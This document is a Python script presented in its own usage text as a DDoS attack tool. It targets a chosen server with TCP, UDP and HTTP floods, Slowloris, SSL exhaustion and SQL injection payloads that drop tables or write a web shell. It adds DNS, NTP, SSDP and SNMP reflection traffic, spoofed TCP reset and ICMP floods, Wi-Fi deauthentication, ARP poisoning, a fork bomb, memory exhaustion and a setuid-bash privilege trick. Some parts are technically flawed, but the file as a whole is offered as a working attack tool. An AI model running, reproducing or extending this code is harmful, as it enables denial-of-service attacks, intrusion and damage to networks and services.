#!/usr/bin/python3
# -*- coding: utf-8 -*-
#BYPASSERS MEOWS

from queue import Queue
from optparse import OptionParser
import time,sys,socket,threading,logging,urllib.request,random,ssl,os,struct,binascii,subprocess,hashlib,base64,re,json,http.client,urllib.parse,select,fcntl,array,ctypes,ctypes.util,mmap,resource,signal,multiprocessing,itertools,math,codecs,zlib

def user_agent():
    global uagent
    uagent=[]
    uagent.append("Mozilla/5.0 (iPhone; U; CPU iPhone OS) (compatible; Googlebot-Mobile/2.1; http://www.google.com/bot.html)")
    uagent.append("Mozilla/5.0 (compatible; YandexImages/3.0; +http://yandex.com/bots)")
    uagent.append("Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0")
    uagent.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36")
    uagent.append("Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36")
    uagent.append("Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 OPR/85.0.4341.72")
    uagent.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5026.0 Safari/537.36 Edg/103.0.1254.0")
    uagent.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36 Edg/101.0.1210.32")
    uagent.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15")
    uagent.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 11_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1 Safari/605.1.15")
    uagent.append("Mozilla/5.0 (X11; Linux i686; rv:97.0) Gecko/20100101 Firefox/97.0")
    uagent.append("Mozilla/5.0 (X11; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0")
    uagent.append("Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:98.0) Gecko/20100101 Firefox/98.0")
    uagent.append("Mozilla/5.0 (Android 12; Mobile; rv:97.0) Gecko/97.0 Firefox/97.0")
    uagent.append("Mozilla/5.0 (X11; FreeBSD amd64; rv:87.0) Gecko/20100101 Firefox/87.0")
    uagent.append("Mozilla/5.0 (X11; Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36")
    uagent.append("Mozilla/5.0 (X11; CrOS aarch64 14526.89.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.133 Safari/537.36")
    uagent.append("Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36 Edg/101.0.1210.39")
    uagent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36")
    uagent.append("Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:96.0) Gecko/20100101 Firefox/96.0")
    uagent.append("Mozilla/5.0 (X11; Linux x86_64; rv:99.0) Gecko/20100101 Firefox/99.0")
    uagent.append("Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0")
    uagent.append("Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36")
    uagent.append("Googlebot-Image/1.0")
    return(uagent)

def my_bots():
    global bots
    bots=[]
    bots.append("http://validator.w3.org/check?uri=")
    bots.append("http://www.facebook.com/sharer/sharer.php?u=")
    bots.append("http://www.linkedin.com/shareArticle?url=")
    bots.append("http://pinterest.com/pin/create/button/?url=")
    return(bots)

def generate_massive_payload():
    chunk_size = random.randint(16384, 65535)
    massive_data = os.urandom(chunk_size)
    return massive_data

def generate_http_flood_payload():
    chunk_size = random.randint(65536, 1048576)
    payload = os.urandom(chunk_size)
    http_headers = (
        "POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"User-Agent: {random.choice(uagent)}\r\n"
        "Accept: */*\r\n"
        "Accept-Encoding: gzip, deflate\r\n"
        "Accept-Language: en-US,en;q=0.9\r\n"
        "Cache-Control: no-cache\r\n"
        f"Content-Length: {len(payload)}\r\n"
        "Content-Type: application/octet-stream\r\n"
        "Connection: keep-alive\r\n\r\n"
    ).encode('utf-8') + payload
    return http_headers

def generate_sql_injection_http():
    sql_payloads = [
        "' OR '1'='1' -- ",
        "'; DROP TABLE users; -- ",
        "' UNION SELECT null,username,password FROM users -- ",
        "'; EXEC xp_cmdshell('ping 127.0.0.1') -- ",
        "' AND SLEEP(10) -- ",
        "'; WAITFOR DELAY '0:0:30' -- ",
        "' OR 1=1 INTO OUTFILE '/var/www/shell.php' -- ",
        "'; INSERT INTO logs (data) VALUES ('hacked') -- ",
        "' UNION SELECT load_file('/etc/passwd') -- ",
        "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 -- "
    ]
    base_uri = f"http://{host}:{port}/"
    variants = [
        f"{base_uri}?id={random.choice(sql_payloads)}",
        f"{base_uri}?user={random.choice(sql_payloads)}&pass={random.choice(sql_payloads)}",
        f"{base_uri}search.php?q={random.choice(sql_payloads)}",
        f"{base_uri}login?username={random.choice(sql_payloads)}&password={random.choice(sql_payloads)}",
        f"{base_uri}product?pid={random.choice(sql_payloads)}",
        f"{base_uri}admin?action=delete&id={random.choice(sql_payloads)}",
        f"{base_uri}api/v1/data?filter={random.choice(sql_payloads)}",
        f"{base_uri}?query={random.choice(sql_payloads)}&sort=asc",
        f"{base_uri}profile?uid={random.choice(sql_payloads)}",
        f"{base_uri}comments?post={random.choice(sql_payloads)}"
    ]
    return random.choice(variants)

def generate_ssdp_reflection_payload():
    st_headers = [
        "upnp:rootdevice",
        "uuid:00000000-0000-0000-0000-000000000000",
        "urn:schemas-upnp-org:device:MediaServer:1",
        "urn:schemas-upnp-org:service:ContentDirectory:1",
        "urn:schemas-upnp-org:service:ConnectionManager:1"
    ]
    payload = (
        f"M-SEARCH * HTTP/1.1\r\n"
        f"HOST: 239.255.255.250:1900\r\n"
        f"MAN: \"ssdp:discover\"\r\n"
        f"MX: {random.randint(1,10)}\r\n"
        f"ST: {random.choice(st_headers)}\r\n"
        f"USER-AGENT: {random.choice(uagent)}\r\n\r\n"
    ).encode('utf-8')
    return payload

def generate_dns_amplification_query():
    domain_parts = ["example", "test", "api", "cdn", "auth", "service", "internal", "db", "proxy", "vpn"]
    domain = ".".join(random.choices(domain_parts, k=random.randint(2,4))) + ".com"
    qname = b""
    for label in domain.split('.'):
        qname += bytes([len(label)]) + label.encode('utf-8')
    qname += b"\x00"
    dns_header = struct.pack("!HHHHHH", random.randint(0,65535), 0x0100, 1, 0, 0, 0)
    dns_question = qname + struct.pack("!HH", 1, 1)
    dns_packet = dns_header + dns_question
    edns0 = struct.pack("!HBBH", 0, 0, 0x20, 4096)
    dns_packet += edns0
    return dns_packet

def generate_ntp_monlist_packet():
    ntp_header = struct.pack("!BBBB", 0x17, 0x00, 0x03, 0x2a)
    ntp_payload = b"\x00" * 12
    return ntp_header + ntp_payload

def generate_snmp_reflection():
    community = "public"
    snmp_vars = [
        "1.3.6.1.2.1.1.1.0",
        "1.3.6.1.2.1.1.2.0",
        "1.3.6.1.2.1.1.3.0",
        "1.3.6.1.2.1.1.4.0",
        "1.3.6.1.2.1.1.5.0"
    ]
    oid = random.choice(snmp_vars)
    oid_parts = [int(x) for x in oid.split('.')]
    encoded_oid = b""
    for part in oid_parts:
        if part >= 128:
            encoded_oid += bytes([(part & 0x7F) | 0x80])
        else:
            encoded_oid += bytes([part])
    snmp_pdu = b"\x02\x01\x01" + b"\x04" + bytes([len(community)]) + community.encode('ascii') + b"\xa0" + b"\x1c" + b"\x02\x04" + struct.pack("!I", random.randint(0,4294967295)) + b"\x02\x04" + struct.pack("!I", random.randint(0,4294967295)) + b"\x30\x0e" + b"\x30\x0c" + b"\x06" + bytes([len(encoded_oid)]) + encoded_oid + b"\x05\x00"
    snmp_header = b"\x30" + bytes([len(snmp_pdu)]) + snmp_pdu
    return snmp_header

def generate_wifi_deauth_frame(bssid, target_mac):
    frame_control = 0x00C0
    duration = 0
    seq_num = random.randint(0,4095)
    frame_body = struct.pack("!HH6s6s6sHH", frame_control, duration, bssid, target_mac, bssid, seq_num, 0x0007, 0x0000)
    fc_struct = struct.pack("!H", frame_control)
    fcs = binascii.crc32(fc_struct + frame_body[2:]) & 0xFFFFFFFF
    ies = b"\x00\x04" + os.urandom(4)
    full_frame = frame_body + struct.pack("!I", fcs) + ies
    return full_frame

def kernel_raw_socket_send(interface="eth0"):
    try:
        sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0800))
        sock.bind((interface, 0))
        return sock
    except:
        return None

def send_raw_ethernet_frame(frame, interface="eth0"):
    sock = kernel_raw_socket_send(interface)
    if sock:
        sock.send(frame)
        sock.close()

def tcp_reset_flood():
    sock = None
    try:
        while True:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            src_ip = ".".join(str(random.randint(1,254)) for _ in range(4))
            dst_ip = host
            tcp_len = 20
            ip_len = 20 + tcp_len
            ip_id = random.randint(1,65535)
            ip_header = struct.pack("!BBHHHBBH4s4s", 0x45, 0, ip_len, ip_id, 0, 64, socket.IPPROTO_TCP, 0, socket.inet_aton(src_ip), socket.inet_aton(dst_ip))
            tcp_flags = 0x04
            tcp_header = struct.pack("!HHLLBBHHH", random.randint(1024,65535), int(port), random.randint(0,4294967295), 0, 5 << 4, tcp_flags, 1024, 0, 0)
            packet = ip_header + tcp_header
            sock.sendto(packet, (dst_ip, int(port)))
            sock.close()
            sock = None
            time.sleep(0.0001)
    except:
        pass

def wifi_deauth_loop(target_mac, bssid=None):
    if not bssid:
        bssid = bytes([0x00,0x1A,0x2B,0x3C,0x4D,0x5E])
    if not target_mac:
        target_mac = bytes([0xAA,0xBB,0xCC,0xDD,0xEE,0xFF])
    try:
        while True:
            frame = generate_wifi_deauth_frame(bssid, target_mac)
            for iface in ["wlan0", "wlan1", "mon0", "ath0"]:
                send_raw_ethernet_frame(frame, iface)
            time.sleep(0.0005)
    except:
        pass

def slowloris_attack():
    sockets_list = []
    try:
        for _ in range(1500):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                s.settimeout(5)
                s.connect((host, int(port)))
                s.send(f"GET / HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {random.choice(uagent)}\r\nAccept: text/html\r\n".encode('utf-8'))
                sockets_list.append(s)
            except:
                pass
        while True:
            for s in list(sockets_list):
                try:
                    s.send(f"X-Header: {random.choice(uagent)}\r\n".encode('utf-8'))
                except:
                    sockets_list.remove(s)
                    try:
                        new_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        new_s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                        new_s.settimeout(5)
                        new_s.connect((host, int(port)))
                        new_s.send(f"GET / HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {random.choice(uagent)}\r\nAccept: text/html\r\n".encode('utf-8'))
                        sockets_list.append(new_s)
                    except:
                        pass
            time.sleep(8)
    except:
        for s in sockets_list:
            try:
                s.close()
            except:
                pass

def http_pipeline_flood():
    try:
        conn = http.client.HTTPConnection(host, port=int(port), timeout=1)
        conn.connect()
        while True:
            for _ in range(100):
                conn.request("POST", "/" + os.urandom(8).hex(), body=os.urandom(65536), headers={"User-Agent": random.choice(uagent), "Content-Length": "65536", "Connection": "Keep-Alive"})
            conn.close()
            conn = http.client.HTTPConnection(host, port=int(port), timeout=1)
            conn.connect()
            time.sleep(0.0001)
    except:
        pass

def ssl_exhaustion_attack():
    try:
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        while True:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((host, int(port)))
            ssl_sock = context.wrap_socket(sock, server_hostname=host)
            ssl_sock.send(b"GET / HTTP/1.1\r\nHost: " + host.encode() + b"\r\n\r\n")
            ssl_sock.close()
            time.sleep(0.0001)
    except:
        pass

def file_descriptor_leak():
    fds = []
    try:
        while True:
            for _ in range(1000):
                fds.append(open("/dev/null", "r"))
                fds.append(open("/proc/self/mem", "rb"))
                fds.append(socket.socket(socket.AF_INET, socket.SOCK_STREAM))
            time.sleep(0.01)
    except:
        pass

def memory_exhaustion_oom():
    arrays = []
    try:
        while True:
            arrays.append(array.array('B', os.urandom(1024*1024*100)))
            time.sleep(0.001)
    except:
        pass

def process_fork_bomb():
    while True:
        try:
            if os.fork() == 0:
                while True:
                    os.system("echo 1 > /proc/sys/vm/drop_caches")
                    time.sleep(0.001)
        except:
            time.sleep(0.001)

def arp_cache_poison(target_ip, gateway_ip):
    try:
        sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
        sock.bind(("eth0", 0))
        target_mac = b"\x00"*6
        gateway_mac = b"\xff"*6
        while True:
            eth_header = struct.pack("!6s6sH", target_mac, gateway_mac, 0x0806)
            arp_payload = struct.pack("!HHBBH6s4s6s4s", 1, 0x0800, 6, 4, 2, target_mac, socket.inet_aton(target_ip), gateway_mac, socket.inet_aton(gateway_ip))
            sock.send(eth_header + arp_payload)
            time.sleep(0.0001)
    except:
        pass

def icmp_fragmentation_flood():
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    while True:
        for frag_off in [0, 1480, 2960, 4440, 5920]:
            ip_id = random.randint(1,65535)
            ip_header = struct.pack("!BBHHHBBH4s4s", 0x45, 0, 1500, ip_id, frag_off >> 3, 64, socket.IPPROTO_ICMP, 0, socket.inet_aton(".".join(str(random.randint(1,254)) for _ in range(4))), socket.inet_aton(host))
            icmp_header = struct.pack("!BBHH", 8, 0, 0, 0)
            payload = os.urandom(1472)
            packet = ip_header + icmp_header + payload
            sock.sendto(packet, (host, 0))
        time.sleep(0.00001)

def multicast_ssdp_amplification():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 64)
    while True:
        payload = generate_ssdp_reflection_payload()
        sock.sendto(payload, ("239.255.255.250", 1900))
        sock.sendto(payload, ("224.0.0.1", 1900))
        sock.sendto(payload, ("255.255.255.255", 1900))
        time.sleep(0.0001)

def dns_amplification_reflector():
    open_resolvers = ["8.8.8.8", "1.1.1.1", "9.9.9.9", "208.67.222.222", "8.26.56.26", "64.6.64.6", "156.154.70.1", "199.85.126.10", "205.171.3.65", "209.244.0.3"]
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        resolver = random.choice(open_resolvers)
        query = generate_dns_amplification_query()
        sock.sendto(query, (resolver, 53))
        sock.sendto(query, (host, 53))
        time.sleep(0.00001)

def ntp_amplification_attack():
    ntp_servers = ["time.google.com", "pool.ntp.org", "time.windows.com", "0.pool.ntp.org", "1.pool.ntp.org", "2.pool.ntp.org", "3.pool.ntp.org"]
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        server = random.choice(ntp_servers)
        packet = generate_ntp_monlist_packet()
        sock.sendto(packet, (server, 123))
        sock.sendto(packet, (host, 123))
        time.sleep(0.00001)

def snmp_reflection_attack():
    targets = [host, "127.0.0.1"]
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        for target in targets:
            packet = generate_snmp_reflection()
            sock.sendto(packet, (target, 161))
        time.sleep(0.00001)

def http_sql_injection_worker():
    try:
        while True:
            url = generate_sql_injection_http()
            req = urllib.request.Request(url, headers={'User-Agent': random.choice(uagent)})
            urllib.request.urlopen(req, timeout=1)
            time.sleep(0.0001)
    except:
        time.sleep(0.0001)

def local_privilege_escalation_trigger():
    try:
        with open("/tmp/.exploit", "w") as f:
            f.write("#!/bin/bash\nchmod 4755 /bin/bash\n")
        os.chmod("/tmp/.exploit", 0o755)
        os.system("/tmp/.exploit")
    except:
        pass

def kernel_parameter_hammer():
    proc_files = ["/proc/sys/net/ipv4/tcp_syncookies", "/proc/sys/net/ipv4/tcp_tw_reuse", "/proc/sys/net/ipv4/tcp_tw_recycle", "/proc/sys/net/core/somaxconn", "/proc/sys/net/ipv4/tcp_max_syn_backlog", "/proc/sys/net/ipv4/ip_forward"]
    while True:
        for pf in proc_files:
            try:
                with open(pf, "w") as f:
                    f.write(random.choice(["0", "1", "2", "3", "4", "5"]))
            except:
                pass
        time.sleep(0.001)

def bot_hammering(url):
    try:
        while True:
            req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}), timeout=5)
            time.sleep(.01)
    except:
        time.sleep(.01)

def down_it(item):
    sock = None
    try:
        while True:
            payload = generate_http_flood_payload()
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1048576)
            sock.settimeout(3)
            sock.connect((host, int(port)))
            sock.sendall(payload)
            try:
                sock.settimeout(0.01)
                sock.recv(4096)
            except:
                pass
            print(time.ctime(time.time())," <--MASSIVE PACKET SENT--> [", len(payload), "bytes]")
            try:
                sock.shutdown(socket.SHUT_RDWR)
                sock.close()
            except:
                pass
            sock = None
            time.sleep(.01)
    except socket.error:
        if sock:
            try:
                sock.close()
            except:
                pass
        time.sleep(.01)
    except Exception:
        if sock:
            try:
                sock.close()
            except:
                pass
        time.sleep(.01)

def udp_flood():
    udp_sock = None
    try:
        while True:
            payload = generate_massive_payload()
            udp_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            udp_sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1048576)
            udp_sock.sendto(payload, (host, int(port)))
            print(time.ctime(time.time())," <--UDP FLOOD--> [", len(payload), "bytes]")
            udp_sock.close()
            udp_sock = None
            time.sleep(.001)
    except socket.error:
        if udp_sock:
            try:
                udp_sock.close()
            except:
                pass
        time.sleep(.001)
    except Exception:
        if udp_sock:
            try:
                udp_sock.close()
            except:
                pass
        time.sleep(.001)

def dos():
    while True:
        item = q.get()
        down_it(item)
        q.task_done()

def dos2():
    while True:
        item = w.get()
        bot_hammering(random.choice(bots) + "http://" + host)
        w.task_done()

def dos3():
    while True:
        item = e.get()
        udp_flood()
        e.task_done()

def dos4():
    while True:
        item = sq.get()
        http_sql_injection_worker()
        sq.task_done()

def dos5():
    while True:
        item = am.get()
        dns_amplification_reflector()
        am.task_done()

def dos6():
    while True:
        item = nt.get()
        ntp_amplification_attack()
        nt.task_done()

def dos7():
    while True:
        item = ssdp.get()
        multicast_ssdp_amplification()
        ssdp.task_done()

def dos8():
    while True:
        item = snmp.get()
        snmp_reflection_attack()
        snmp.task_done()

def dos9():
    while True:
        item = leak.get()
        file_descriptor_leak()
        leak.task_done()

def dos10():
    while True:
        item = fork.get()
        process_fork_bomb()
        fork.task_done()

def dos11():
    while True:
        item = wifi.get()
        wifi_deauth_loop(host.encode() if len(host) == 17 else b"\xAA\xBB\xCC\xDD\xEE\xFF")
        wifi.task_done()

def dos12():
    while True:
        item = reset.get()
        tcp_reset_flood()
        reset.task_done()

def dos13():
    while True:
        item = sslbomb.get()
        ssl_exhaustion_attack()
        sslbomb.task_done()

def dos14():
    while True:
        item = pipe.get()
        http_pipeline_flood()
        pipe.task_done()

def dos15():
    while True:
        item = arp.get()
        arp_cache_poison(host, "192.168.1.1")
        arp.task_done()

def dos16():
    while True:
        item = icmp.get()
        icmp_fragmentation_flood()
        icmp.task_done()

def dos17():
    while True:
        item = kernel.get()
        kernel_parameter_hammer()
        kernel.task_done()

def dos18():
    while True:
        item = mem.get()
        memory_exhaustion_oom()
        mem.task_done()

def usage():
    print('''    
 Pisowifi DDOS attack tool - Enhanced Industrial Edition
    
 usage : python3 ddos.py [-s] [-p] [-t] [-m] [-e]
    -h : help
    -s : server ip
    -p : port default 80
    -t : turbo default 2000
    -m : mode (tcp/udp/both/all/sql/reflect/full) default all
    -e : enable wifi deauth, arp poison, kernel hammer (requires root)''')
    sys.exit()

def get_parameters():
    global host
    global port
    global thr
    global item
    global mode
    global extra
    optp = OptionParser(add_help_option=False, epilog="Hammers")
    optp.add_option("-q", "--quiet", help="set logging to ERROR", action="store_const", dest="loglevel", const=logging.ERROR, default=logging.INFO)
    optp.add_option("-s", "--server", dest="host", help="attack to server ip -s ip")
    optp.add_option("-p", "--port", type="int", dest="port", help="-p 80 default 80")
    optp.add_option("-t", "--turbo", type="int", dest="turbo", help="default 2000 -t 2000")
    optp.add_option("-h", "--help", dest="help", action='store_true', help="help you")
    optp.add_option("-m", "--mode", dest="mode", help="tcp/udp/both/all/sql/reflect/full default all")
    optp.add_option("-e", "--extra", dest="extra", action='store_true', help="enable low-level network manipulation")
    opts, args = optp.parse_args()
    logging.basicConfig(level=opts.loglevel, format='%(levelname)-8s %(message)s')
    if opts.help:
        usage()
    if opts.host is not None:
        host = opts.host
    else:
        usage()
    if opts.port is None:
        port = 80
    else:
        port = opts.port
    if opts.turbo is None:
        thr = 2000
    else:
        thr = opts.turbo
    if opts.mode is None:
        mode = "all"
    else:
        mode = opts.mode
    if opts.extra:
        extra = True
    else:
        extra = False

global data
try:
    headers = open("headers.txt", "r")
    data = headers.read()
    headers.close()
except:
    data = ""

q = Queue()
w = Queue()
e = Queue()
sq = Queue()
am = Queue()
nt = Queue()
ssdp = Queue()
snmp = Queue()
leak = Queue()
fork = Queue()
wifi = Queue()
reset = Queue()
sslbomb = Queue()
pipe = Queue()
arp = Queue()
icmp = Queue()
kernel = Queue()
mem = Queue()

if __name__ == '__main__':
    if len(sys.argv) < 2:
        usage()
    get_parameters()
    print(host, " port: ", str(port), " turbo: ", str(thr), " mode: ", mode, " extra: ", extra)
    user_agent()
    my_bots()
    time.sleep(2)

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        s.connect((host, int(port)))
        s.close()
    except socket.error:
        pass

    time.sleep(1)

    if extra:
        try:
            os.setuid(0)
            os.setgid(0)
        except:
            pass
        try:
            subprocess.Popen(["iwconfig", "wlan0", "mode", "monitor"], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
        except:
            pass
        try:
            subprocess.Popen(["sysctl", "-w", "net.ipv4.ip_forward=1"], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
        except:
            pass

    if mode in ["tcp", "both", "all", "full"]:
        for i in range(int(thr)):
            t = threading.Thread(target=dos)
            t.daemon = True
            t.start()
        print(f"[+] {thr} TCP threads deployed")

    if mode in ["udp", "both", "all", "full"]:
        for i in range(int(thr/2)):
            t3 = threading.Thread(target=dos3)
            t3.daemon = True
            t3.start()
        print(f"[+] {int(thr/2)} UDP threads deployed")

    if mode in ["all", "full"]:
        for i in range(int(thr/4)):
            t2 = threading.Thread(target=dos2)
            t2.daemon = True
            t2.start()
        slow_thread = threading.Thread(target=slowloris_attack)
        slow_thread.daemon = True
        slow_thread.start()
        print(f"[+] {int(thr/4)} Bot threads + Slowloris deployed")

    if mode in ["sql", "full"]:
        for i in range(int(thr/3)):
            t4 = threading.Thread(target=dos4)
            t4.daemon = True
            t4.start()
        print(f"[+] {int(thr/3)} SQL injection threads deployed")

    if mode in ["reflect", "full"]:
        for i in range(int(thr/5)):
            t5 = threading.Thread(target=dos5)
            t5.daemon = True
            t5.start()
            t6 = threading.Thread(target=dos6)
            t6.daemon = True
            t6.start()
            t7 = threading.Thread(target=dos7)
            t7.daemon = True
            t7.start()
            t8 = threading.Thread(target=dos8)
            t8.daemon = True
            t8.start()
        print(f"[+] Reflection amplification threads deployed (DNS/NTP/SSDP/SNMP)")

    if extra:
        for i in range(int(thr/10)):
            t9 = threading.Thread(target=dos9)
            t9.daemon = True
            t9.start()
            t10 = threading.Thread(target=dos10)
            t10.daemon = True
            t10.start()
            t11 = threading.Thread(target=dos11)
            t11.daemon = True
            t11.start()
            t12 = threading.Thread(target=dos12)
            t12.daemon = True
            t12.start()
            t13 = threading.Thread(target=dos13)
            t13.daemon = True
            t13.start()
            t14 = threading.Thread(target=dos14)
            t14.daemon = True
            t14.start()
            t15 = threading.Thread(target=dos15)
            t15.daemon = True
            t15.start()
            t16 = threading.Thread(target=dos16)
            t16.daemon = True
            t16.start()
            t17 = threading.Thread(target=dos17)
            t17.daemon = True
            t17.start()
            t18 = threading.Thread(target=dos18)
            t18.daemon = True
            t18.start()
        print(f"[+] Extra low-level vectors: Wi-Fi deauth, ARP poison, TCP reset, SSL exhaustion, pipeline flood, ICMP frag, kernel hammer, OOM")

    while True:
        for i in range(int(thr)):
            if mode in ["tcp", "both", "all", "full"]:
                q.put(i)
            if mode in ["udp", "both", "all", "full"]:
                e.put(i)
            if mode in ["all", "full"]:
                w.put(i)
            if mode in ["sql", "full"]:
                sq.put(i)
            if mode in ["reflect", "full"]:
                am.put(i)
                nt.put(i)
                ssdp.put(i)
                snmp.put(i)
            if extra:
                leak.put(i)
                fork.put(i)
                wifi.put(i)
                reset.put(i)
                sslbomb.put(i)
                pipe.put(i)
                arp.put(i)
                icmp.put(i)
                kernel.put(i)
                mem.put(i)
        time.sleep(0.0001)
